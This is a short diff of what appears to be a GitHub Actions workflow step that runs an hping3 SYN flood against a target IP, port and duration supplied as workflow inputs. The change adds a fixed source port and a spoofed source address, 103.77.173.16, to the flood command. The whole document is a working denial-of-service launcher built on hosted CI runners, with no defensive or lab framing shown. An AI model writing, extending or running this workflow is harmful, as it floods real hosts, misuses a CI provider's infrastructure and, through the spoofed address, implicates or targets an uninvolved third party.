@@ -33,4 +33,4 @@ jobs:
       - name: Run hping3 flood
         run: |
           echo "Flooding ${{ github.event.inputs.target_ip }}:${{ github.event.inputs.target_port }} for ${{ github.event.inputs.duration }}s"
-          timeout ${{ github.event.inputs.duration }} sudo hping3 --flood -S -p ${{ github.event.inputs.target_port }} ${{ github.event.inputs.target_ip }}
+          timeout ${{ github.event.inputs.duration }} sudo hping3 --flood -S -p ${{ github.event.inputs.target_port }} -s 443 -a 103.77.173.16 ${{ github.event.inputs.target_ip }}
